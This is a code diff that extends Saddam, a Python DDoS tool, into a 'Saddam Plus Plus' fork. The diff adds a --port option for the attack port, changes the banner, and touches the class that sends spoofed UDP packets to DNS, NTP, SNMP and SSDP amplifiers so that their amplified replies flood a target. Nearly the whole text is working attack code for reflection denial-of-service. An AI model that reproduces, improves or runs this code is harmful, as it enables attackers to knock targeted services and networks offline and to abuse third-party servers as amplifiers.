@@ -14,13 +14,13 @@ USAGE = '''
 '''
 
 LOGO = r'''
-	   _____           __    __              
-	  / ___/____ _____/ /___/ /___ _____ ___ 
-	  \__ \/ __ `/ __  / __  / __ `/ __ `__ \
-	 ___/ / /_/ / /_/ / /_/ / /_/ / / / / / /
-	/____/\__,_/\__,_/\__,_/\__,_/_/ /_/ /_/ 
-	https://github.com/OffensivePython/Saddam
-	   https://twitter.com/OffensivePython
+	   _____           __    __                   ____  __              ____  __              
+	  / ___/____ _____/ /___/ /___ _____ ___     / __ \/ /_  _______   / __ \/ /_  _______    
+	  \__ \/ __ `/ __  / __  / __ `/ __ `__ \   / /_/ / / / / / ___/  / /_/ / / / / / ___/    
+	 ___/ / /_/ / /_/ / /_/ / /_/ / / / / / /  / ____/ / /_/ (__  )  / ____/ / /_/ (__  )     
+	/____/\__,_/\__,_/\__,_/\__,_/_/ /_/ /_/  /_/   /_/\__,_/____/  /_/   /_/\__,_/____/ 
+	https://github.com/OffensivePython/Saddam ~ https://github.com/merkjinx/saddam-plus-plus
+	https://twitter.com/OffensivePython
 '''
 
 HELP = (
@@ -28,14 +28,17 @@ HELP = (
 	'NTP Amplification file',
 	'SNMP Amplification file',
 	'SSDP Amplification file',
-	'Number of threads (default=1)' )
+	'Number of threads (default=1)', 
+	'Attack port of target'
+)
 
 OPTIONS = (
 	(('-d', '--dns'), dict(dest='dns', metavar='FILE:FILE|DOMAIN', help=HELP[0])),
 	(('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
 	(('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
 	(('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
-	(('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])) )
+	(('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])),
+	(('-P', '--port'), dict(dest='sendingport', type=int, default=(randint(1,65535)), metavar='port', help=HELP[5])) )
 
 BENCHMARK = (
 	'Protocol'
@@ -88,7 +91,8 @@ SUFFIX = {
 	1: 'K',
 	2: 'M',
 	3: 'G',
-	4: 'T'}
+	4: 'T',
+	5: 'O'}
 
 def Calc(n, d, unit=''):
 	i = 0
@@ -170,11 +174,12 @@ def Benchmark(ddos):
 		f.close()
 
 class DDoS(object):
-	def __init__(self, target, threads, domains, event):
+	def __init__(self, target, threads, domains, event,sendingport):
 		self.target = target
 		self.threads = threads
 		self.event = event
 		self.domains = domains
+		self.sendingport = sendingport
 	def stress(self):
 		for i in range(self.threads):
 			t = threading.Thread(target=self.__attack)
@@ -183,7 +188,7 @@ class DDoS(object):
 		'''
 			Send a Spoofed Packet
 		'''
-		udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
+		udp = UDP(self.sendingport, PORT[proto], payload).pack(self.target, soldier)
 		ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
 		sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
 	def GetAmpSize(self, proto, soldier, domain=''):
@@ -305,10 +310,10 @@ def main():
 		event = threading.Event()
 		event.set()
 		if 'BENCHMARK'==args[0].upper():
-			ddos = DDoS(args[0], options.threads, domains, event)
+			ddos = DDoS(args[0], options.threads, domains, event,options.sendingport)
 			Benchmark(ddos)
 		else:
-			ddos = DDoS(socket.gethostbyname(args[0]), options.threads, domains, event)
+			ddos = DDoS(socket.gethostbyname(args[0]), options.threads, domains, event,options.sendingport)
 			ddos.stress()
 			Monitor()
 			event.clear()
